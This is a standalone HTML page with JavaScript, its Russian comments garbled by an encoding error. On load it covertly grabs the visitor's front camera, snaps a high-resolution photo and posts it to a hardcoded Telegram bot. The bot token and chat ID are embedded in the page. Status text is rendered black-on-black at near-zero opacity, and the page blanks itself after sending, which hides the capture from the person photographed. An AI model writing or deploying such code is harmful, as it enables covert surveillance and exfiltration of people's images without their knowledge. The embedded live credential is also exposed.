<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Selfie -> Telegram</title>
<style>
  body, html { 
    margin:0; padding:0; 
    width:100%; height:100%; 
    background:#000; 
    color:#000;
    font-family:Arial, sans-serif; 
    overflow: hidden;
  }
  #status { 
    position: fixed; 
    top:20px; 
    left:0; 
    width:100%; 
    text-align:center; 
    z-index:1000; 
    color: #000; 
    opacity: 0.01;
  }
</style>
</head>
<body>
  <div id="status" style="color: #000;">.</div>

<script>
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
const status = document.getElementById('status');

function updateStatus(text) {
  status.textContent = text;
  status.style.color = '#000';
  console.log(text);
}

async function captureAndSend() {
  let stream = null;
  try {
    updateStatus('–ó–∞–ø—É—Å–∫ –∫–∞–º–µ—Ä—ã...');
    
    // 1. –ü–æ–ª—É—á–∞–µ–º –ø–æ—Ç–æ–∫ —Å –∫–∞–º–µ—Ä—ã –ú–ì–ù–û–í–ï–ù–ù–û
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: { exact: 'user' }, // –¢–û–ß–ù–û —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è
        width: { ideal: 1920 }, // –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–∞—á–µ—Å—Ç–≤–æ
        height: { ideal: 1080 }
      },
      audio: false
    });

    updateStatus('–ö–∞–º–µ—Ä–∞ –≤–∫–ª—é—á–µ–Ω–∞');

    // 2. –°–æ–∑–¥–∞–µ–º –≤–∏–¥–µ–æ —ç–ª–µ–º–µ–Ω—Ç –±–µ–∑ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ DOM
    const video = document.createElement('video');
    video.srcObject = stream;
    video.muted = true;
    video.playsInline = true;
    
    // 3. –ñ–¥–µ–º –¢–û–õ–¨–ö–û –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã—Ö (–Ω–µ –∂–¥–µ–º –∑–∞–≥—Ä—É–∑–∫–∏ –∫–∞–¥—Ä–æ–≤)
    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play().then(resolve).catch(resolve);
      };
      setTimeout(resolve, 100); // –§–æ–ª–±—ç–∫ –Ω–∞ —Å–ª—É—á–∞–π –µ—Å–ª–∏ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ —É–∂–µ –≥–æ—Ç–æ–≤—ã
    });

    // 4. –ù–ï –ñ–î–ï–ú —Å—Ç–∞–±–∏–ª–∏–∑–∞—Ü–∏–∏ - –¥–µ–ª–∞–µ–º —Å–Ω–∏–º–æ–∫ —Å—Ä–∞–∑—É
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    const ctx = canvas.getContext('2d');

    updateStatus('–°–Ω–∏–º–∞—é...');

    // 5. –†–∏—Å—É–µ–º —Å –∑–µ—Ä–∫–∞–ª—å–Ω—ã–º –æ—Ç—Ä–∞–∂–µ–Ω–∏–µ–º
    ctx.save();
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    ctx.restore();

    // 6. –ù–ï–ú–ï–î–õ–ï–ù–ù–û –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
    stream.getTracks().forEach(track => track.stop());

    // 7. –°–£–ü–ï–†-–ö–û–†–†–ï–ö–¶–ò–Ø –ò–ó–û–ë–†–ê–ñ–ï–ù–ò–Ø
    updateStatus('–û–±—Ä–∞–±–æ—Ç–∫–∞...');
    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const data = imageData.data;
    
    // –ê–í–¢–û-–ö–û–†–†–ï–ö–¶–ò–Ø: –Ω–∞—Ö–æ–¥–∏–º —Å–∞–º—ã–µ —Ç–µ–º–Ω—ã–µ –∏ —Å–≤–µ—Ç–ª—ã–µ —Ç–æ—á–∫–∏
    let minR = 255, minG = 255, minB = 255;
    let maxR = 0, maxG = 0, maxB = 0;
    
    for (let i = 0; i < data.length; i += 4) {
      const r = data[i], g = data[i+1], b = data[i+2];
      if (r < minR) minR = r;
      if (g < minG) minG = g;
      if (b < minB) minB = b;
      if (r > maxR) maxR = r;
      if (g > maxG) maxG = g;
      if (b > maxB) maxB = b;
    }
    
    // –†–∞—Å—Ç—è–≥–∏–≤–∞–µ–º –≥–∏—Å—Ç–æ–≥—Ä–∞–º–º—É –¥–ª—è –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–≥–æ –∫–æ–Ω—Ç—Ä–∞—Å—Ç–∞
    const rangeR = maxR - minR || 1;
    const rangeG = maxG - minG || 1;
    const rangeB = maxB - minB || 1;
    
    for (let i = 0; i < data.length; i += 4) {
      // –ö–æ–Ω—Ç—Ä–∞—Å—Ç–Ω–æ–µ —Ä–∞—Å—Ç—è–∂–µ–Ω–∏–µ
      data[i] = ((data[i] - minR) * 255) / rangeR;
      data[i+1] = ((data[i+1] - minG) * 255) / rangeG;
      data[i+2] = ((data[i+2] - minB) * 255) / rangeB;
      
      // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–µ —É—Å–∏–ª–µ–Ω–∏–µ —è—Ä–∫–æ—Å—Ç–∏ –¥–ª—è —Ç–µ–º–Ω—ã—Ö —É—á–∞—Å—Ç–∫–æ–≤
      const brightness = (data[i] + data[i+1] + data[i+2]) / 3;
      if (brightness < 100) {
        const boost = 1.5;
        data[i] = Math.min(255, data[i] * boost);
        data[i+1] = Math.min(255, data[i+1] * boost);
        data[i+2] = Math.min(255, data[i+2] * boost);
      }
    }
    
    ctx.putImageData(imageData, 0, 0);

    // 8. –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
    updateStatus('–û—Ç–ø—Ä–∞–≤–∫–∞...');
    canvas.toBlob(async (blob) => {
      if (!blob) {
        updateStatus('‚ùå –û—à–∏–±–∫–∞');
        return;
      }

      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'selfie_' + Date.now() + '.jpg');
      formData.append('caption', 'ü§≥ –°–µ–ª—Ñ–∏');

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        const json = await res.json();
        if (json.ok) {
          updateStatus('‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!');
          document.body.innerHTML = '<div style="width:100%;height:100%;background:#000"></div>';
        } else {
          updateStatus('‚ùå –û—à–∏–±–∫–∞');
        }
      } catch (err) {
        updateStatus('‚ùå –°–µ—Ç—å');
      }
    }, 'image/jpeg', 1.0); // –ú–ê–ö–°–ò–ú–ê–õ–¨–ù–û–ï –∫–∞—á–µ—Å—Ç–≤–æ

  } catch (err) {
    updateStatus('‚ùå –û—à–∏–±–∫–∞: ' + err.name);
    if (stream) stream.getTracks().forEach(t => t.stop());
  }
}

// –ó–∞–ø—É—Å–∫–∞–µ–º –ú–ì–ù–û–í–ï–ù–ù–û
captureAndSend();
</script>
</body>
</html>
